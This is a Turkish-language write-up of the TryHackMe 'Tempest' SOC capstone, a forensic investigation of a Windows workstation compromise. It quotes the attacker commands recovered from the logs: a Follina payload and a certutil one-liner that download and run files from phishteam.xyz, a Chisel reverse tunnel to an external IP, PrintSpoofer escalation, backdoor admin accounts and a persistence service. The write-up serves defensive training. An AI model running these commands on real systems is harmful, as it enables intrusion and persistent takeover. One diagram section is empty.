# ⛈️ Tempest | SOC Level 1 Capstone Challenge

**Etiketler:** `#SOC` `#DFIR` `#Sysmon` `#Wireshark` `#Brim` `#EvtxECmd` `#TimelineExplorer` `#Follina` `#CVE-2022-30190` `#PrintSpoofer` `#Chisel` `#WinRM` `#SeImpersonatePrivilege` `#TryHackMe`

## 1. Mimari Yapı ve Uçtan Uca İhlal Zinciri (Full Attack Chain)

Bu capstone senaryosunda, **TEMPEST** isimli bir kurumsal Windows iş istasyonunun oltalama dokümanından tam sistem ele geçirmeye (**Full Machine Compromise**) kadar uzanan bütün adli bilişim ve olay müdahale (**DFIR**) hattı incelenmektedir.

  

Analist; **Uç Nokta Telemetrisi (Sysmon, Windows Event Logs)** ile **Ağ Telemetrisini (PCAP / Wireshark & Brim)** çapraz korelasyona tabi tutarak saldırganın adım adım izlediği siber ölüm zincirini (**Cyber Kill Chain**) modeller.

  

```

```

├────────────────────────────────────────────────────────┤

## 3. Delil Doğrulama, Komutlar ve Parametre Referansı

### A. Olay Yeri Delil Bütünlüğü (Cryptographic Hash Verification)

Adli vakalarda analize başlamadan önce delil dosyalarının bütünlüğü (integrity) SHA-256 ile mühürlenir:

  

PowerShell

```
# Masaüstündeki vaka dizinine geçiş
cd 'C:\Users\user\Desktop\Incident Files\'

# PCAP ağ paket yakalama dosyasının SHA256 özetini alma
Get-FileHash -Algorithm SHA256 .\capture.pcapng
# Çıktı: CB3A1E6ACFB246F256FBFEFDB6F494941AA30A5A7C3F5258C3E63CFA27A23DC6

# Sysmon operasyonel logunun SHA256 özetini alma
Get-FileHash -Algorithm SHA256 .\sysmon.evtx
# Çıktı: 665DC3519C2C235188201B5A8594FEA205C3BCBC75193363B87D2837ACA3C91F

# Windows sistem/güvenlik logunun SHA256 özetini alma
Get-FileHash -Algorithm SHA256 .\windows.evtx
# Çıktı: D0279D5292BC5B25595115032820C978838678F4333B725998CFE9253E186D60
```

### B. EvtxECmd ile CSV Dönüşümü

PowerShell

```
# EvtxECmd aracının bulunduğu dizine geçiş
cd 'C:\Tools\EvtxECmd'

# Sysmon loglarını Timeline Explorer'ın okuyabileceği CSV formatına dönüştürme
.\EvtxECmd.exe -f 'C:\Users\user\Desktop\Incident Files\sysmon.evtx' --csv 'C:\Users\user\Desktop\Incident Files' --csvf sysmon.csv
```

- **Parametre Açıklamaları:**
    
      
    - `-f`: Ayrıştırılacak kaynak `.evtx` dosyasının tam yolu.
        
          
        
    - `--csv`: Çıktının kaydedileceği hedef klasör yolu.
        
          
        
    - `--csvf`: Oluşturulacak CSV dosyasının adı (`sysmon.csv`).
        
          
        

### C. Saldırganın Çalıştırdığı Komut Zinciri ve Adli Anlamları

#### 1. Follina (CVE-2022-30190) Tarafından Yürütülen Base64 Payload

PowerShell

```
# Base64 Kodunun Açılmış (Decoded) Hali:
$app=[Environment]::GetFolderPath('ApplicationData');
cd "$app\Microsoft\Windows\Start Menu\Programs\Startup";
iwr http://phishteam.xyz/02dcf07/update.zip -outfile update.zip;
Expand-Archive .\update.zip -DestinationPath .;
rm update.zip;
```

- **Amaç:** Kullanıcının Başlangıç (Startup) klasörüne sızarak `update.zip` dosyasını indirmek (`iwr`), arşivden çıkarmak (`Expand-Archive`) ve arşivi silmektir. Kullanıcı bir sonraki oturum açışında içerideki betik otomatik çalışır.
    
      
    

#### 2. Startup Klasöründen Tetiklenen Stage 2 İndirici (LOLBAS)

DOS

```
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -w hidden -noni certutil -urlcache -split -f 'http://phishteam.xyz/02dcf07/first.exe' C:\Users\Public\Downloads\first.exe; C:\Users\Public\Downloads\first.exe
```

- `-w hidden`: Komut istemi penceresini kurbandan gizler.
    
      
    
- `-noni`: Etkileşimsiz (non-interactive) modda çalıştırır.
    
      
    
- `certutil -urlcache -split -f`: Güvenlik duvarını atlatarak meşru Windows sertifika aracı üzerinden `first.exe` ikilisini `C:\Users\Public\Downloads\` dizinine indirir ve yürütür.
    
      
    

#### 3. Chisel ile Ters SOCKS Proxy Tüneli Açma

DOS

```
C:\Users\benimaru\Downloads\ch.exe client 167.71.199.191:8080 R:socks
```

- `client 167.71.199.191:8080`: Saldırganın sunucusundaki 8080 portunda dinleyen Chisel sunucusuna bağlanır.
    
      
    
- `R:socks`: Kurban makineden dışarıya doğru bir ters (reverse) SOCKS proxy tüneli oluşturur; saldırgan bu tünel üzerinden kurbanın iç portlarına (5985 / WinRM) bağlanır.
    
      
    

#### 4. PrintSpoofer ile Yetki Yükseltme ve Kalıcı Servis Kurma

DOS

```
:: SeImpersonatePrivilege yetkisini istismar ederek SYSTEM yetkisinde final.exe C2 ikilisini başlatma
spf.exe -c "C:\ProgramData\final.exe"

:: Başarısız ve başarılı kullanıcı ekleme denemeleri
net user shion password           :: Hatalı (/add parametresi eksik!)
net user shion password /add      :: Başarılı (EID 4720)
net user shuna password /add      :: Başarılı (EID 4720)
net localgroup administrators /add shion :: Yöneticilere ekleme (EID 4732)

:: Makinede kalıcı Windows servisi oluşturma (Persistence)
C:\Windows\system32\sc.exe \\TEMPEST create TempestUpdate2 binpath= C:\ProgramData\final.exe start= auto
```

- **Gerekçe:** Follina (`CVE-2022-30190`), `SeImpersonatePrivilege` $\rightarrow$ PrintSpoofer yetki yükseltme mekanizması, `Chisel` tünellemesi ve `sc.exe create` servis kalıcılığı mülakatlarda bir adayın teoriyi aşıp gerçek dünyada uçtan uca adli bilişim yapıp yapamadığını test eden en popüler senaryolardır.
    
      
    
- **Pazar Günü 3 Dakikalık Tekrar Stratejisi:**
    
      
    1. **1. Dakika:** Olay zincirini tek nefeste zihninde canlandır:
        
          
        
        _Word (.doc) açıldı (PID 496) $\rightarrow$ Follina tetiklendi $\rightarrow$ Startup içine Base64 ile `update.zip` atıldı $\rightarrow$ Oturum açılışında `certutil` ile `first.exe` indirildi._
        
          
        
    2. **2. Dakika:** Pivot ve Yetki Yükseltmeyi açıkla:
        
          
        
        _Saldırgan içeride parola (`infernotempest`) ve 5985 (WinRM) buldu $\rightarrow$ `chisel` ile reverse SOCKS tüneli kurdu $\rightarrow$ `whoami /priv` ile `SeImpersonatePrivilege` gördü $\rightarrow$ `PrintSpoofer` (`spf.exe`) ile SYSTEM yetkisine çıktı._
        
          
        
    3. **3. Dakika:** Sonuç ve Kalıcılık Refleksini söyle:
        
          
        
        _SYSTEM olunca `shion` ve `shuna` kullanıcılarını açtı (EID 4720), `shion`'u yöneticilere ekledi (EID 4732), `sc.exe create TempestUpdate2` ile `final.exe`'yi otomatik başlayan bir Windows servisi yaptı._
